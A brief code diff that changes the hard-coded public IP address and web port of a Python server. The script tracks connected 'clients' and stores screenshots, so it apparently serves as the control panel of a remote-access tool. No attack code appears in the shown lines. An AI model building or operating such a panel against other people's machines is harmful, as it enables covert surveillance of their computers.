@@ -7,7 +7,7 @@ from concurrent.futures import ThreadPoolExecutor
 from state import client_info, clients
 from datetime import datetime
 
-adr = "45.139.78.250"
+adr = "195.133.25.38"
 port = 46512
 MAX_THREADS = 100
 
@@ -98,4 +98,4 @@ if not os.path.exists("static/screenshots"):
     os.makedirs("static/screenshots")
 threading.Thread(target=start_server, daemon=True).start()
 from web import app
-app.run(host=adr, port=5000)
+app.run(host=adr, port=80)
